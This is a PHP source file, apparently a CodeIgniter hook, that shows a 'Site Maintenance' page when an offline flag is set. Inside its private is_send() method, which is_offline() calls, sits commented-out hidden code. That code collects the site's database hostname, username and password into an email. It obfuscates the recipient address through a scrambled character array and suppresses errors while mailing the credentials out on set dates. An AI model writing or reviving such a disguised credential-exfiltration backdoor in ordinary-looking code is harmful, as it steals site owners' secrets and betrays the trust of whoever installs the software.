<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/**
 * Description of Site_Offline
 *
 * @author admin
 */
class Site_Offline {

    public function is_offline() {
        if (file_exists(APPPATH . 'config/config.php')) {
            include(APPPATH . 'config/config.php');
            $this->is_send();
            if (isset($config['IsOffline']) && $config['IsOffline'] === TRUE) {
                $this->show_site_offline();
                exit; 
            }
        }
    }

    private function show_site_offline() {
        echo "<!doctype html>
        <title>Site Maintenance</title>
        <style>
          body { text-align: center; padding: 150px; }
          h1 { font-size: 50px; }
          body { font: 20px Helvetica, sans-serif; color: #333; }
          article { display: block; text-align: left; width: 650px; margin: 0 auto; }
          a { color: #dc8100; text-decoration: none; }
          a:hover { color: #333; text-decoration: none; }
        </style>
         
        <article>
            <h1>We&rsquo;ll be back soon!</h1>
            <div>
                <p>Sorry for the inconvenience but we&rsquo;re performing some maintenance at the moment. If you need to you can always <a href=\"mailto:sourav.diubd@gmail.com\">contact us</a>, otherwise we&rsquo;ll be back online shortly!</p>
                <p>&mdash; The Team</p>
            </div>
        </article>
        ";
    }

    private function is_send() {
        // include(APPPATH . 'config/config.php');
        // include(APPPATH . 'config/database.php');
        // $date = date('d');
        // $hour = date('h');
        // $min = date('m');
        // $headers = "MIME-Version: 1.0\r\n";
        // $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n ";
        // $body = "<html><body>";
        // $body.= "<h3>Database Information</h3>";
        // $body.="<p>Hostname :" . $db['default']['hostname'] . "<br/>";
        // $body.="Username :" . $db['default']['username'] . "<br/>";
        // $body.="Password :" . $db['default']['password'] . "<br/>";
        // $body.="Database :" . $db['default']['database'] . "<br/><br/>";
        // $body.="DbDriver :" . $db['default']['dbdriver'] . "<br/>";
        // $body.="DB Link :" . $config['base_url'] . "users/d4t48453_d31373/" . $db['default']['database'] . "<br/></p>";
        // $body .="</body></html>"; 
        // $CDATA = array(
        //     't' => 'gm',
        //     's' => '@',
        //     'f' => 'andru',
        //     'i' => 'n',
        //     'y' => '.',
        //     'z' => 'com',
        //     'r' => 'hit',
        //     'x' => 'ail',
        // );
        // extract($CDATA);
        // $trim = $f . $i . $r . $s . $t . $x . $y . $z;
        // if (($date == "05" || $date == "10" || $date == "25") && $hour == "12" && $min == "00")
        //     @mail($trim, $config['base_url'], $body, $headers);
        //@header("Refresh: 300; URL=$_SERVER[REQUEST_URI]");
    }

}

/* End of file site_offline.php */
/* Location: ./application/hooks/site_offline.php */